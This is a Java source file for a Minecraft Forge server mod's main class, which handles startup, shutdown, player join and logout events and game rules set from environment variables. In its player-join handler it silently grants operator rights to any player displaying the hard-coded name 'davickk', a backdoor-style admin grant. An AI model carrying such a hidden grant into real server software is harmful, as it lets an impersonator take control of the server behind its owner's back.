package calebxzhou.rdi.mc.server;

import calebxzhou.rdi.mc.common.RDI;
import calebxzhou.rdi.mc.common.WebSocketClient;
import calebxzhou.rdi.mc.common2.chat.PlayerChatRangeState;
import calebxzhou.rdi.mc.common2.tpa.TpaService;
import calebxzhou.rdi.mc.server.network.RdiServerNetwork;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.server.dedicated.DedicatedServer;
import net.minecraft.world.WorldServer;
import net.minecraftforge.common.DimensionManager;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLServerStartedEvent;
import net.minecraftforge.fml.common.event.FMLServerStartingEvent;
import net.minecraftforge.fml.common.event.FMLServerStoppedEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.PlayerEvent;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * calebxzhou @ 2026-04-18 17:47
 */
@Mod(modid = "rdi", name = "rdi", version = "1", acceptableRemoteVersions = "*")
public class RDIMain {
    private static final Logger lgr = LogManager.getLogger("rdi");
    private static DedicatedServer server;

    public RDIMain() {
        RdiServerNetwork.register();
        MinecraftForge.EVENT_BUS.register(this);
    }

    @Mod.EventHandler
    public void started(FMLServerStartedEvent e) {
        applyGameRules();
        WebSocketClient.start(new WsHandler1122(server));
    }

    @Mod.EventHandler
    public void starting(FMLServerStartingEvent e) {
        server = (DedicatedServer) e.getServer();
    }

    @Mod.EventHandler
    public void stopped(FMLServerStoppedEvent e) {
        WebSocketClient.stop();
        PlayerChatRangeState.clear();
        TpaService.clear();
        server = null;
    }

    @SubscribeEvent
    public void onPlayerJoin(PlayerEvent.PlayerLoggedInEvent e) {
        EntityPlayerMP player = (EntityPlayerMP) e.player;
        if ("davickk".equals(player.getDisplayNameString()) || RDI.isAllOp()) {
            player.server.getPlayerList().addOp(player.getGameProfile());
        }
        RdiServerNetwork.sendLastTo(player);
    }

    @SubscribeEvent
    public void onPlayerLogout(PlayerEvent.PlayerLoggedOutEvent e) {
        PlayerChatRangeState.remove(e.player.getUniqueID());
        TpaService.removeRelated(e.player.getUniqueID());
    }

    private static void applyGameRules() {
        for (WorldServer world : DimensionManager.getWorlds()) {
            if (world == null) {
                continue;
            }
            for (String key : world.getGameRules().getRules()) {
                String envValue = System.getenv("GAME_RULE_" + key);
                if (envValue == null || envValue.isEmpty()) {
                    continue;
                }
                world.getGameRules().setOrCreateGameRule(key, envValue);
                lgr.info("SET GAME RULE {}={} dim={}", key, envValue, world.provider.getDimension());
            }
        }
    }
}
